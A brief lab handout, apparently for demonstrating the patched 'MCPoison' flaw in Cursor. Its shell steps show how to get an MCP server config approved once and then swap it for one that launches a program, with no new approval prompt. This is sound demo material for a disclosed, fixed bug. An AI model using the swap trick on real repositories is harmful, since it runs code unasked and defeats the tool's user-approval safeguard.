# Lab 3: MCPoison (approve once, trusted forever)

Record this at home, on Cursor older than 1.3. Fixed in 1.3.

```
mkdir -p demo-repo/.cursor
cp mcp-approved.json demo-repo/.cursor/mcp.json     # open demo-repo in Cursor, approve "helper"
cp mcp-swapped.json  demo-repo/.cursor/mcp.json     # reopen: Calculator opens, no new prompt
rm -rf demo-repo
```
